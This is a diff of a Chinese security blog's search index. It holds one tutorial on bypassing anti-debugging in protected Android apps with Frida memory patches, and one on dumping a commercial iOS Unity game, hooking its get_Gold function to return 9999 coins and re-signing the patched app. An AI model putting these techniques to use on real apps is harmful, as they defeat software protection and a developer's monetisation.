NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">        </div><div class="line">"""</div><div class="line">script = session.create_script(src)</div><div class="line">script.on(<span class="string">"message"</span>, on_message)</div><div class="line">script.load()</div><div class="line">sys.stdin.read()</div></pre></td></tr></table></figure>
+<p>#总结<br>这里再简述一下反调试的原理，壳APP通过Hook libdvm.so&amp;libart.so中的_Z12dvmDbgActivev&amp;_ZN3art3Dbg8GoActiveEv函数，使其跳转到自己写的函数中执行kill操作导致无法调试。<br>目前在脱壳之后遇到java反调试，皆可用对比libdvm.so&amp;libart.so寻找差异点将其修复绕过反调试，感兴趣的大佬可以通过其他被hook的函数研究加固或者函数抽取的原理。</p>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+        <tag>反调试</tag>
+        <tag>反反调试</tag>
       </tags>
   </entry>
   <entry>
@@ -3641,46 +3571,6 @@ print flag
       <tags>
         <tag>pwn</tag>
         <tag>stack</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>梆梆&amp;爱加密java反调试绕过</title>
-    <url>/2020/05/19/%E6%A2%86%E6%A2%86-%E7%88%B1%E5%8A%A0%E5%AF%86java%E5%8F%8D%E8%B0%83%E8%AF%95%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<p>各位道友有没有在越过重重native反调试脱掉壳之后想要调试smali的过程中突然发现在使用AndroidStdio动态调试smali的时候只要一挂载APP就会崩溃，本篇主要整理一下在调试梆梆&amp;爱加密过程中遇到的java层反调试以及绕过的方式<br><a id="more"></a></p>
-<p>在将梆梆&amp;爱加密脱壳之后通过AS调试APP遇到反调试挂载失败，只要debug便会杀掉APP进程</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug9.png" alt=""></p>
-<h1 id="Dalvik虚拟机下的反调试绕过"><a href="#Dalvik虚拟机下的反调试绕过" class="headerlink" title="Dalvik虚拟机下的反调试绕过"></a>Dalvik虚拟机下的反调试绕过</h1><p>虽然Dalvik已经在逐步退出市场，但是这里还是由他开始，大家都知道Dalvik的核心库是libdvm.so，在调试的过程中与APP建立连接少不了对libdvm.so的引用，因此libdvm.so几乎是最有嫌疑的地方。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug.jpg" alt=""></p>
-<h2 id="获取libdvm-so"><a href="#获取libdvm-so" class="headerlink" title="获取libdvm.so"></a>获取libdvm.so</h2><p>所谓获取libdvm.so需要获取APP未启动时libdvm.so源文件，这里只要去/system/lib目录下将其提取到本地即可。<br>其次需要加固APP运行时libdvm.so，这里我通过IDA动态挂载APP之后将其从内存中dump出来。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">auto</span> fp, begin, end, dexbyte;</div><div class="line">  fp = fopen(<span class="string">"D:\\dump.so"</span>, <span class="string">"wb"</span>);</div><div class="line">  begin = <span class="number">0x786A0000</span>;</div><div class="line">  end = begin + <span class="number">0x67000</span> ;</div><div class="line">  <span class="keyword">for</span> ( dexbyte = begin; dexbyte &lt; end; dexbyte ++ )</div><div class="line">      fputc(Byte(dexbyte), fp);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>小小脚本，不成敬意</p>
-<h2 id="比较libdvm-so"><a href="#比较libdvm-so" class="headerlink" title="比较libdvm.so"></a>比较libdvm.so</h2><p>在获取到两个libdvm.so之后通过BeyondCompare进行比较</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug5.png" alt=""></p>
-<p>通过比较可以看出在加固的APP运行之后，libdvm.so被改了几部分数据，并不是所有不同的地方都和反调试有关，通过IDA对照便宜去看看都改了什么地方，最终发现与java调试相关的地址为0x423B0，当然其他地方也有一些小惊喜，比如梆梆&amp;爱加密抽取函数所hook的函数什么的。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug2.png" alt=""></p>
-<p>_Z12dvmDbgActivev是java调试相关函数，主要功能是啥我也不是很清楚，有清楚的大佬希望可以留言告知一下，万分感谢。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug7.jpg" alt=""></p>
-<p>由此可见加固APP是通过hook _Z12dvmDbgActivev函数使其跳转到它自己构造的函数，并且在其中将进程kill掉防止调试。那么我们只要将Hook之后的libdvm.so再Hook修改为原函数，让其正常运行_Z12dvmDbgActivev函数，就可以绕过反调试了。</p>
-<h2 id="Hook-libdvm-so"><a href="#Hook-libdvm-so" class="headerlink" title="Hook libdvm.so"></a>Hook libdvm.so</h2><p>这里通过frida hook _Z12dvmDbgActivev函数地址，打印内存，将原本函数正确内存数据写入对应地址中</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> frida</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></div><div class="line">    print(message)</div><div class="line"></div><div class="line">redv = frida.get_remote_device()</div><div class="line">session = redv.attach(<span class="string">"com.sf.activity"</span>)</div><div class="line"></div><div class="line">src = <span class="string">"""</span></div><div class="line">    var jnibind1 = undefined;</div><div class="line">    var jnibind2 = undefined;</div><div class="line">    var jnibind3 = undefined;</div><div class="line">    var jnibind4 = undefined;</div><div class="line">    var jnibind5 = undefined;</div><div class="line">    var jnibind6 = undefined;</div><div class="line">    var jnibind7 = undefined;</div><div class="line">    var f = Module.findBaseAddress("libdvm.so");</div><div class="line">    console.log("address: " + f);</div><div class="line">    jnibind1 = f.add(0x000423C0);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">    var vArray = [0x0D,0x4B,0x0E,0x4A,0x7B,0x44,0x10,0xB5,0x9C,0x58,0x94,0xF8,0xC6,0x33];</div><div class="line">    Memory.writeByteArray(p1P, vArray);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">        </div><div class="line">"""</div><div class="line">script = session.create_script(src)</div><div class="line">script.on(<span class="string">"message"</span>, on_message)</div><div class="line">script.load()</div><div class="line">sys.stdin.read()</div></pre></td></tr></table></figure>
-<p>frida hook之后结果</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug10.png" alt=""></p>
-<p>反调试已经绕过啦！！！</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug8.png" alt=""></p>
-<h1 id="Art虚拟机下的反调试绕过"><a href="#Art虚拟机下的反调试绕过" class="headerlink" title="Art虚拟机下的反调试绕过"></a>Art虚拟机下的反调试绕过</h1><h2 id="获取libart-so"><a href="#获取libart-so" class="headerlink" title="获取libart.so"></a>获取libart.so</h2><p>art虚拟机下的反调试绕过同上述的dalvik方法相同，只是关键的运行库libdvm.so替换为libart.so,同样要去/system/lib目录下将其提取到本地，这里需要注意的是在提取之前要确认运行的是libart.so还是libart64.so。</p>
-<h2 id="比较libart-so"><a href="#比较libart-so" class="headerlink" title="比较libart.so"></a>比较libart.so</h2><p>在获取到两个libart.so之后通过BeyondCompare进行比较</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug6.png" alt=""></p>
-<p>最终确认反调试Hook地址为0x10ABC4</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug4.png" alt=""></p>
-<p>_ZN3art3Dbg8GoActiveEv函数功能同Dalvik中_Z12dvmDbgActivev函数功能类似，绕过方法与Dalvik保持一致。</p>
-<h2 id="Hook-libart-so"><a href="#Hook-libart-so" class="headerlink" title="Hook libart.so"></a>Hook libart.so</h2><p>这里通过frida hook _ZN3art3Dbg8GoActiveEv函数地址，打印内存，将原本函数正确内存数据写入对应地址中</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> frida</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></div><div class="line">    print(message)</div><div class="line"></div><div class="line">redv = frida.get_remote_device()</div><div class="line">session = redv.attach(<span class="string">"com.sf.activity"</span>)</div><div class="line"></div><div class="line">src = <span class="string">"""</span></div><div class="line">    var jnibind1 = undefined;</div><div class="line">    var jnibind2 = undefined;</div><div class="line">    var jnibind3 = undefined;</div><div class="line">    var jnibind4 = undefined;</div><div class="line">    var jnibind5 = undefined;</div><div class="line">    var jnibind6 = undefined;</div><div class="line">    var jnibind7 = undefined;</div><div class="line">    var f = Module.findBaseAddress("libart.so");</div><div class="line">    console.log("address: " + f);</div><div class="line">    jnibind1 = f.add(0x00115BC4);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">    var vArray = [0x2D, 0xE9, 0xF0, 0x4F, 0x9B, 0xB0, 0xDF, 0xF8, 0xBC, 0x0D, 0xDF, 0xF8, 0xBC, 0x1D];</div><div class="line">    Memory.writeByteArray(p1P, vArray);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">        </div><div class="line">"""</div><div class="line">script = session.create_script(src)</div><div class="line">script.on(<span class="string">"message"</span>, on_message)</div><div class="line">script.load()</div><div class="line">sys.stdin.read()</div></pre></td></tr></table></figure>
-<p>#总结<br>这里再简述一下反调试的原理，壳APP通过Hook libdvm.so&amp;libart.so中的_Z12dvmDbgActivev&amp;_ZN3art3Dbg8GoActiveEv函数，使其跳转到自己写的函数中执行kill操作导致无法调试。<br>目前在脱壳之后遇到java反调试，皆可用对比libdvm.so&amp;libart.so寻找差异点将其修复绕过反调试，感兴趣的大佬可以通过其他被hook的函数研究加固或者函数抽取的原理。</p>
-]]></content>
-      <tags>
-        <tag>Android</tag>
-        <tag>反调试</tag>
-        <tag>反反调试</tag>
       </tags>
   </entry>
   <entry>
@@ -3870,6 +3760,116 @@ void swap(int *a,int *b)
         <tag>ELF</tag>
         <tag>动态链接</tag>
         <tag>静态链接</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Unity3D游戏修改&amp;iOS免越狱hook</title>
+    <url>/2020/06/04/iOS%E5%85%8D%E8%B6%8A%E7%8B%B1hook&amp;Unity3D%E6%B8%B8%E6%88%8F%E4%BF%AE%E6%94%B9/</url>
+    <content><![CDATA[<p>所谓免越狱Hook就是在iOS设备未进行越狱操作的前提下，对APP进行Hook操作，很久之前就有听说过，昨天花了一天时间整环境外加测试，然后又顺带修改了一个比较让人烦恼的游戏，Unity3D破解其实很早就搞过了，这次借着免越狱Hook一起分享给大家。</p>
+<a id="more"></a>
+<h1 id="工欲善其事必先利其器"><a href="#工欲善其事必先利其器" class="headerlink" title="工欲善其事必先利其器"></a>工欲善其事必先利其器</h1><ul>
+<li>越狱iPhone(必须)<br>虽然最终修改之后的APP是要装到非越狱的iPhone上，但是APP需要砸壳，外加PP助手下架之后没啥好地方下载砸壳之后的ipa了，因此必须要有一部越狱的iPhone。</li>
+<li>未越狱iPhone<br>这个不用说了，目标APP安装</li>
+<li>MonKeyDev<br>AloneMonkey大佬的作品，Hook插件编写神器，大佬还在其中集成了iOSOpenDev，同时也是非越狱插件开发集成的神器。<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85" target="_blank" rel="external">官方安装指南</a></li>
+<li>frida-ios-dump<br>AloneMonkey大佬的又一力作，砸壳神器，iOS逆向一年多了，目前为止无往不利<br>iOS frida安装 <a href="https://frida.re/docs/ios/" target="_blank" rel="external">官方安装指南</a><br>frida-ios-dump使用 <a href="https://frida.re/docs/ios/" target="_blank" rel="external">项目地址</a></li>
+<li>IDA<br>分析砸壳后的APP，导入符号表python脚本方便分析</li>
+<li>Il2CppDumper<br><a href="https://github.com/Perfare/Il2CppDumper" target="_blank" rel="external">项目地址</a><br>Unity3D游戏分析利器，Unity转换成IL2CPP的符号表提取工具，目前只支持Windows平台，最终生成的符号表脚本导入IDA用</li>
+<li>IPAPatch<br><a href="https://github.com/Naituw/IPAPatch" target="_blank" rel="external">项目地址</a><br>用于重新打包签名ipa并安装到非越狱iPhone上，非常强大。如果不想写Hook插件，也可以采取修改汇编的方式重新打包安装ipa</li>
+<li>汇编码转换器<br><a href="http://www.pc6.com/softview/SoftView_594816.html" target="_blank" rel="external">下载地址</a><br>各种类型汇编代码生成机器码的工具，方便静态修改可执行文件，重打包签名安装</li>
+</ul>
+<h1 id="抽丝剥茧"><a href="#抽丝剥茧" class="headerlink" title="抽丝剥茧"></a>抽丝剥茧</h1><p>如果上诉工具全都准备齐全，那么就就可以开始逆向工作了，作为一个侦探密，平时喜欢玩一些密室游戏，今天修改的这款游戏叫做密室逃脱绝境系列–游乐园，不得不说情节设计的很不错，在一次尝试使用提示功能时，突然发现需要金币，然而免费金币需要看广告，每次只给一枚，但是提示的话费确实逐渐增长的，感觉有被冒犯到，所以有了接下来的一切。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook3.jpg" alt=""></p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook4.jpg" alt=""></p>
+<h2 id="砸壳"><a href="#砸壳" class="headerlink" title="砸壳"></a>砸壳</h2><p>首先我们需要砸壳后的ipa进行分析，定位到底需要修改什么。</p>
+<p>端口转发</p>
+<pre><code>iproxy 2222 22
+</code></pre><p>首先通过frida查找要砸壳的APP进程</p>
+<pre><code>Mac-mini:frida-ios-dump-master-2 $ frida-ps -U
+ PID  Name
+----  -------------------------------------------------
+2911  App Store
+2947  信息
+2980  密室逃脱绝境系列11游乐园
+2936  微信
+2972  设置
+2949  邮件
+2814  AppleIDAuthAgent
+1412  AssetCacheLocatorService
+</code></pre><p>接着运行dump.py即可脱壳</p>
+<pre><code>Mac-mini:frida-ios-dump-master-2 $ python2 dump.py 密室逃脱绝境系列11游乐园
+Start the target app 密室逃脱绝境系列11游乐园
+Dumping 密室逃脱绝境系列11游乐园 to /var/folders/m7/g2v2sbfd19g9kg7sk20n639h0000gn/T
+start dump /var/containers/Bundle/Application/617F2079-957E-4005-92B8-7573FE651A8E/app1.app/app1
+app1.fid: 100%|███████████████████████████████████████████████████████████████| 35.7M/35.7M [00:07&lt;00:00, 5.03MB/s]
+InfoPlist.strings: 213MB [00:44, 4.97MB/s]                                                                         
+0.00B [00:00, ?B/s]Generating &quot;密室逃脱绝境系列11游乐园.ipa&quot;
+</code></pre><h2 id="Unity3D符号表恢复"><a href="#Unity3D符号表恢复" class="headerlink" title="Unity3D符号表恢复"></a>Unity3D符号表恢复</h2><p>在做这一步操作之前，机智的人已经将可执行文件脱到IDA文件中开始分析了，APP脱壳后解压ipa，然后查看app1包内容，主程序可执行文件使我们首要分析目标，一般来说是整个包中最大的那个文件。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook5.jpg" alt=""></p>
+<p>在IDA分析的过程中，我们刚好通过Il2CppDumper来提取符号表，提取符号表需要两个文件，一个是上述的主程序可执行文件，另一个则是符号表文件global-metadata.dat，iOS下该文件位于xxx.app/Data/Managed/Metadata目录下</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook6.jpg" alt=""></p>
+<p>先后选择两个文件之后，程序跳出需要输入Unity version</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook7.png" alt=""></p>
+<p>我们怎么确认到底是用了什么版本的Unity呢，只要在IDA里搜索字符串X-Unity-Version即可，调用的地方会出现版本号，我们要找的版本号即2018.4.3f1</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook8.png" alt=""></p>
+<p>在输入版本号之后，选择3即可</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook9.png" alt=""></p>
+<p>同时在Il2CppDumper的目录下，会生成dump.cs和script.py两个文件</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook10.png" alt=""></p>
+<p>将script.py导入IDA，File——&gt;Script File——&gt;选择script.py<br>该脚本的主要作用是辅助IDA识别IL2CPP表函数名，在加载脚本之前IDA识别的函数形如sub_xxxxxxx</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook11.png" alt=""></p>
+<p>加载脚本之后对函数进行了标记形成格式如类名$$函数名这样的函数</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook12.png" alt=""></p>
+<h2 id="定位修改点"><a href="#定位修改点" class="headerlink" title="定位修改点"></a>定位修改点</h2><p>在将script.py导入IDA之后，我们立刻着手分析dump.cs这个文件，该文件里面解析了游戏相关的属性和函数。可以用C#工具打开，我这里直接用source打开分析。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook13.png" alt=""></p>
+<p>与其说是分析，不如说是查找更为准确一些，我们想要修改的最终目的肯定是拥有永远花不完的金币，那么我们就去针对金币去搜索定位，我搜索了Gold，定位到有一个函数为get_Gold较为可疑</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook16.png" alt=""></p>
+<p>在IDA定位到函数地址</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook15.png" alt=""></p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook14.png" alt=""></p>
+<p>之后通过lldb下断点调试，发现在打开提示的时候触发了断点，运气不错，返回上层调用查看结果为0，之后去看了个两个视频获得了两个金币之后，返回值果然变成了2，可疑确定程序就是通过这个函数来获取金币的数量。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook17.jpg" alt=""></p>
+<h1 id="直捣黄龙"><a href="#直捣黄龙" class="headerlink" title="直捣黄龙"></a>直捣黄龙</h1><p>分析定位修改点之后，就可以对游戏进行修改了，原本是想通过免越狱Hook实现对游戏的修改，但是尝试了多次一直hook不成功，多次查找发现未越狱iOS并不支持MSHookFunction方式进行hook，同时没法对形如sub_xxxxx函数进行inlinehook。<br>这里介绍两种修改方式，一种是通过iOS越狱Hook来实现对关键函数的Hook修改，主要依赖于MonkeyDev，游戏修改了之后肯定不会天天抱着一个越狱手机来玩，所以这里准备的另一种种修改方式是针对未越狱手机的，通过直接修改汇编，重打包签名ipa安装到手机上，主要依赖于IPAPatch</p>
+<h2 id="iOS越狱修改"><a href="#iOS越狱修改" class="headerlink" title="iOS越狱修改"></a>iOS越狱修改</h2><p>iOS越狱插件的编写这里采用MonKeyDev，如何使用可见<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8" target="_blank" rel="external">官方文档</a></p>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
+<li>在hook不同APP时将Tweak的plist中Bundles修改应用对应的Bundleid</li>
+<li>在Build Settings——&gt;User-Defined新建项CODE_SIGNING_ALLOWED，赋值为NO，否则编译会报错</li>
+<li>File——&gt;Project Setting将Build System修改为Legacy Build System否则编译报错</li>
+<li>切记安装sshpass</li>
+</ul>
+<h3 id="插件编写"><a href="#插件编写" class="headerlink" title="插件编写"></a>插件编写</h3><p>MonKeyDev支持多种Hook框架，我这里使用Tweak插件。<br>具体hook代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;mach-o/dyld.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">// 用于保存原函数指针</span></div><div class="line"><span class="keyword">int</span> (*old_get_Gold)();</div><div class="line"></div><div class="line"><span class="comment">// 新函数</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">new_get_Gold</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> <span class="number">9999</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">%ctor&#123;</div><div class="line"><span class="comment">// 执行hook</span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> Gold = <span class="number">_</span>dyld_get_image_vmaddr_slide(<span class="number">0</span>) + <span class="number">0x1011aa060</span>;</div><div class="line">MSHookFunction((<span class="keyword">void</span> *)Gold, (<span class="keyword">void</span> *)&amp;new_get_Gold, (<span class="keyword">void</span> **)&amp;old_get_Gold);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="iOS未越狱修改"><a href="#iOS未越狱修改" class="headerlink" title="iOS未越狱修改"></a>iOS未越狱修改</h2><h3 id="修改汇编"><a href="#修改汇编" class="headerlink" title="修改汇编"></a>修改汇编</h3><p>首先查看get_Gold函数返回位置汇编，返回时传入X1进行经过函数转换为int返回，那么可以将9999传入X0，然后直接ret即可</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook21.png" alt=""></p>
+<p>通过汇编指令生成工具生成我们需要的机器码</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook22.png" alt=""></p>
+<p>ret的机器码为C0 03 5F D6 </p>
+<p>最后修改对应地址的机器码即可</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook25.png" alt=""></p>
+<h3 id="重打包签名"><a href="#重打包签名" class="headerlink" title="重打包签名"></a>重打包签名</h3><p>将修改后的app1可执行文件重新放回原处，将解压后的ipa包重新压缩，最终改名为app.ipa,将该文件放到IPAPatch的Assets目录下，替换掉原本的app.ipa文件。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook23.jpg" alt=""></p>
+<p>最终安装到未越狱手机上效果如下</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook24.jpg" alt=""></p>
+<h1 id="隔山打牛"><a href="#隔山打牛" class="headerlink" title="隔山打牛"></a>隔山打牛</h1><p>iOS免越狱hook主要是通过iosOpenDev生成dylib注入目标APP实现Hook，iosOpenDev是apple官方支持的插件生成工具，可直接由Xcode生成。可生成CaptainHookTweak、Logos Tweak两种dylib。在注入dylib之后对APP进行重打包签名。</p>
+<p>我们接下来用到的MonKeyDev是对原有iOSOpenDev的升级，更加方便于非越狱插件的编写。</p>
+<h3 id="新建项目-amp-编译"><a href="#新建项目-amp-编译" class="headerlink" title="新建项目&amp;编译"></a>新建项目&amp;编译</h3><p>MonKeyDev安装完成之后，打开Xcode新建项目，滑动到最下方可以看到MonKeyDev提供的模块，选择第一个。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook18.jpg" alt=""></p>
+<p>新建之后需要配置General——&gt;Signing，设置自己的AppleID后续用于签名。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook19.jpg" alt=""></p>
+<p>接下来将砸壳后的ipa或ipa解压后的xxx.app放入Your_P<br>roject/TargetApp目录下，编译整个项目，最终安装到未越狱手机上信任之后正常运行表明签名成功。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook20.jpg" alt=""></p>
+<h3 id="寻找注入点Hook"><a href="#寻找注入点Hook" class="headerlink" title="寻找注入点Hook"></a>寻找注入点Hook</h3><p>虽然最终没能成功实现免越狱hook修改游戏，但是我们还是拿它下手</p>
+<p>首先通过Class-dump将头文件dump下来，在其中寻找一个又代表性的函数进行Hook，最终决定hook UnityAppController这个类中的init函数，在他调用的时候弹出弹框。</p>
+<p>在your_projectDylib.xm中Hook代码如下:</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;sys/sysctl.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;UIKit/UIKit.h&gt;</span></span></div><div class="line"></div><div class="line">%hook UnityAppController</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Hooking an instance method with an argument.</span></div><div class="line">- (<span class="keyword">void</span>)init&#123;</div><div class="line">%orig;</div><div class="line"></div><div class="line">UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@<span class="string">"Hook成功"</span> message:nil delegate:self cancelButtonTitle:@<span class="string">"OK"</span> otherButtonTitles:nil];</div><div class="line">[alert show];</div><div class="line"><span class="comment">//[alert release];</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div></pre></td></tr></table></figure>
+<p>运行程序将ipa装到未越狱手机上，游戏打开之后会有弹框出现</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook26.jpg" alt=""></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本来准备写一篇免越狱Hook结合Unity3D游戏修改为一体的文章，但是但是在Hook c函数的过程中遇到了难题，目前还没有找到未越狱手机上inlinhook的好方案，只能将两者分开来写，之后找到好的方案之后再进行修改为大家分享。</p>
+<p>下面附上本人iOS Unity3D入门看的一篇文章，本文大致参考了这位大佬的框架。<a href="https://www.ichenxiaoyu.com/archero/#%E5%B7%A5%E5%85%B7" target="_blank" rel="external">iOS上的Unity逆向与弓箭传说游戏修改</a></p>
+]]></content>
+      <tags>
+        <tag>iOS</tag>
+        <tag>Hook</tag>
+        <tag>Unity3D</tag>
       </tags>
   </entry>
 </search>
